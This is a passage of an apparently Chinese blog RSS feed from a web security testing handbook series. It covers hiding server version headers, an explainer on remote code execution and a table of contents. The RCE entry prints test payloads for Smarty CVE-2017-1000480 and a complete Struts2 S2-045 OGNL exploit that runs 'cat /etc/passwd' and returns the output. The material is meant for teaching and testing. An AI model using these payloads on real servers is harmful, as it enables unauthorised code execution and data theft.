&lt;h4 id=&quot;iis&quot;&gt;IIS&lt;/h4&gt;

&lt;p&gt;找到&lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP响应头&lt;/code&gt;设置响应报文内容，可以将&lt;code class=&quot;highlighter-rouge&quot;&gt;ASP.NET&lt;/code&gt;随意更改，甚至删除&lt;/p&gt;

&lt;h4 id=&quot;nginx&quot;&gt;Nginx&lt;/h4&gt;

&lt;p&gt;在加入&lt;code class=&quot;highlighter-rouge&quot;&gt;conf/nginx.conf&lt;/code&gt;一行：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server_tokens off;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;tomcat&quot;&gt;Tomcat&lt;/h4&gt;

&lt;p&gt;到apache-tomcat安装目录下的lib子文件夹，找到catalina.jar这包，并进行解解压&lt;/p&gt;

&lt;p&gt;修改:&lt;code class=&quot;highlighter-rouge&quot;&gt;lib\catalina.zip\org\apache\catalina\util\ServerInfo.properties&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server.info=X
server.number=5.5
server.built=Dec 1 2015 22:30:46 UTC
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Thu, 22 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-04-18/2</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-18/2</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>远程代码执行</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- 远程代码执行
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-远程代码执行---介绍&quot;&gt;0x00 远程代码执行 - 介绍&lt;/h2&gt;

&lt;h3 id=&quot;1什么是远程代码执行&quot;&gt;1）什么是远程代码执行&lt;/h3&gt;

&lt;p&gt;远程命令执行 英文名称：&lt;strong&gt;RCE (remote code execution)&lt;/strong&gt; ，简称&lt;strong&gt;RCE&lt;/strong&gt;漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。&lt;/p&gt;

&lt;h3 id=&quot;2远程代码执行的特点&quot;&gt;2）远程代码执行的特点&lt;/h3&gt;

&lt;p&gt;远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。&lt;/p&gt;

&lt;h2 id=&quot;0x01-远程代码执行---风险等级&quot;&gt;0x01 远程代码执行 - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;高&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-远程代码执行---原理&quot;&gt;0x02 远程代码执行 - 原理&lt;/h2&gt;

&lt;p&gt;由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。&lt;/p&gt;

&lt;h2 id=&quot;0x03-远程代码执行---常见场景&quot;&gt;0x03 远程代码执行 - 常见场景&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;使用了危险函数的Web应用&lt;/li&gt;
  &lt;li&gt;低版本的Java语言Struts框架&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;h3 id=&quot;php中常见场景---模板引擎代码执行&quot;&gt;PHP中常见场景 - 模板引擎代码执行&lt;/h3&gt;

&lt;p&gt;Smarty简介&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Smarty是一个PHP的模板引擎。更明确来说，它可以帮助开发者更好地 分离程序逻辑和页面显示。最好的例子，是当程序员和模板设计师是不同的两个角色的情况，而且 大部分时候都不是同一个人的情况。&lt;/p&gt;

  &lt;p&gt;CVE-ID : CVE-2017-1000480&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;产生原因：由于未对用户的输入点进行过滤，导致经过eval函数，造成代码执行&lt;/p&gt;

&lt;p&gt;测试Payload：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*/phpinfo();/*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-16/0x00.png&quot; alt=&quot;0x00&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;java-struts2-s2-045&quot;&gt;Java Struts2 （S2-045）&lt;/h3&gt;

&lt;p&gt;Struts 简介&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。&lt;/p&gt;

  &lt;p&gt;CVE-ID : CVE-2017-5638&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;产生原因：由于未对用户输入点进行过滤，被带入ErrorMessage，当做OGLN表达式解析，造成代码执行&lt;/p&gt;

&lt;p&gt;测试Payload：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-16/0x01.png&quot; alt=&quot;0x01&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;p&gt;升级插件、框架新版本&lt;/p&gt;
</description>
        <pubDate>Thu, 22 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-22/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-22/1</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>Web安全测试学习手册</title>
        <description>&lt;p&gt;准备在博客记录Web安全测试学习手册，先把目录列出来，之前参考了OWASP测试指南，写了一份Word，但是在Word里不好阐述风险的成因以及危害，所以针对每个风险我会以环境来详细的扣清楚。
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-17/0x00.png&quot; alt=&quot;Web安全测试学习手册&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x01-配置管理测试&quot;&gt;0x01 配置管理测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;远程代码执行&lt;/li&gt;
  &lt;li&gt;Slow HTTP DOS&lt;/li&gt;
  &lt;li&gt;点击劫持：X-Frame-Options头丢失&lt;/li&gt;
  &lt;li&gt;服务器启用了不安全的HTTP方法&lt;/li&gt;
  &lt;li&gt;中间件版本信息泄露&lt;/li&gt;
  &lt;li&gt;服务器端目录遍历&lt;/li&gt;
  &lt;li&gt;中间件解析漏洞&lt;/li&gt;
  &lt;li&gt;IIS短文件名漏洞&lt;/li&gt;
  &lt;li&gt;应用程序未容错&lt;/li&gt;
  &lt;li&gt;SVN文件泄露&lt;/li&gt;
  &lt;li&gt;OpenSSL心脏出血漏洞&lt;/li&gt;
  &lt;li&gt;SSL/TLS “受戒礼”漏洞&lt;/li&gt;
  &lt;li&gt;SSL POODLE漏洞&lt;/li&gt;
  &lt;li&gt;分布式部署文件可读&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x02-数据验证测试&quot;&gt;0x02 数据验证测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;XSS跨站脚本攻击&lt;/li&gt;
  &lt;li&gt;SQL注入&lt;/li&gt;
  &lt;li&gt;任意文件读取&lt;/li&gt;
  &lt;li&gt;任意文件上传漏洞&lt;/li&gt;
  &lt;li&gt;XML实体注入&lt;/li&gt;
  &lt;li&gt;代码注入&lt;/li&gt;
  &lt;li&gt;命令注入&lt;/li&gt;
  &lt;li&gt;任意文件下载&lt;/li&gt;
  &lt;li&gt;本地文件包含&lt;/li&gt;
  &lt;li&gt;远程文件包含&lt;/li&gt;
  &lt;li&gt;框架注入&lt;/li&gt;
  &lt;li&gt;链接注入&lt;/li&gt;
  &lt;li&gt;SSRF服务器请求伪造&lt;/li&gt;
  &lt;li&gt;CSRF跨站请求伪造&lt;/li&gt;
  &lt;li&gt;任意URL跳转&lt;/li&gt;
  &lt;li&gt;JSON劫持&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x03-会话管理测试&quot;&gt;0x03 会话管理测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;会话固定&lt;/li&gt;
  &lt;li&gt;多次登录错误锁定机制&lt;/li&gt;
  &lt;li&gt;COOKIE未设置HTTP Only属性&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-业务逻辑测试&quot;&gt;0x04 业务逻辑测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;任意用户密码重置&lt;/li&gt;
  &lt;li&gt;图形验证码绕过&lt;/li&gt;
  &lt;li&gt;短信验证码绕过&lt;/li&gt;
  &lt;li&gt;短信验证码重放&lt;/li&gt;
  &lt;li&gt;业务流程绕过&lt;/li&gt;
  &lt;li&gt;加密算法脆弱&lt;/li&gt;
  &lt;li&gt;支付逻辑漏洞&lt;/li&gt;
  &lt;li&gt;条件竞争(HTTP并发)&lt;/li&gt;
  &lt;li&gt;前端认证绕过&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x05-身份认证测试&quot;&gt;0x05 身份认证测试&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;账号弱口令&lt;/li&gt;
  &lt;li&gt;登录错误消息凭证枚举&lt;/li&gt;
  &lt;li&gt;空口令攻击&lt;/li&gt;
  &lt;li&gt;垂直越权&lt;/li&gt;
  &lt;li&gt;水平越权&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x06-结语&quot;&gt;0x06 结语&lt;/h2&gt;

&lt;p&gt;这些测试项参考了OWASP测试指南与AWVS扫描报告&lt;/p&gt;

&lt;p&gt;:D 如果有什么缺陷，还望联系我补充。&lt;/p&gt;

&lt;p&gt;另外，每一篇的参考链接都会放在文末，只是做一些方便工作归档的整理。&lt;/p&gt;

</description>
        <pubDate>Wed, 21 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-21/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-21/1</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
  </channel>
</rss>
